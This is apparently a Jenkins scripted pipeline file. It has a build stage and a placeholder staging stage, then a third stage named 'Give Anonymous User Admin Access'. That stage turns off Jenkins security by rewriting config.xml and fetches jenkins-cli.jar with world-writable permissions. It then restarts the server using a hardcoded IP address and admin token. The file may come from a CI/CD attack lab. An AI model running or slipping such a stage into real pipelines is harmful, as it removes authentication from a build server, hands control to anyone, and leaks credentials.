node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Give Anonymous User Admin Access') {
      sh '''
      sed -i 's/<useSecurity>true<\\/useSecurity>/<useSecurity>false<\\/useSecurity>/g' /var/lib/jenkins/config.xml
      wget http://<server-ip>:8080/jnlpJars/jenkins-cli.jar
          chmod 777 jenkins-cli.jar
      java -jar jenkins-cli.jar -s http://35.219.155.246:8080/ -auth admin:115f85a4563a86571a6fd4a16fc9ac6bef restart
      '''
      
    }
}